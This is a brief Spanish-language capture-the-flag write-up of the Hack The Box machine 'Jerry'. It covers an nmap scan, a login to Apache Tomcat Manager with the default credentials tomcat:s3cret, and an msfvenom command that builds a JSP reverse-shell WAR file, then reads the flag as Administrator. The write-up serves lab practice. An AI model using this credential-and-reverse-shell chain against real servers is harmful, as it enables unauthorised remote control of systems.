# Jerry ![Avatar](https://www.hackthebox.eu/storage/avatars/59f03a24178dbb2bdc94968c201e21f8_thumb.png)     

## Scan

```nmap
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-favicon: Apache Tomcat
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache Tomcat/7.0.88
```
## Enumeration

Lo unico que tenemos para enumerar en principio es un Apache Tomcat, probemos con las password por defecto de Tomcat 
```
tomcat:s3cret
```
## Exploit

Como durante la enumeración obtuvimos acceso al Manger de Tomcat, ahora tenemos la posibilidad de subir una shell en formato war al servidor, para ello vamos a generar una con msfvenom
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=PORT -f war > shell.war
```
## Privesc

No hay privesc en esta máquina ya que tenemos acceso al administrador directamente

```
C:\Users\Administrator\Desktop\flags>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is FC2B-E489

 Directory of C:\Users\Administrator\Desktop\flags

06/19/2018  07:09 AM    <DIR>          .
06/19/2018  07:09 AM    <DIR>          ..
06/19/2018  07:11 AM                88 2 for the price of 1.txt
```
Y solo faltaría conseguir leer la flag
```cmd
C:\Users\Administrator\Desktop\flags>type 2*
```
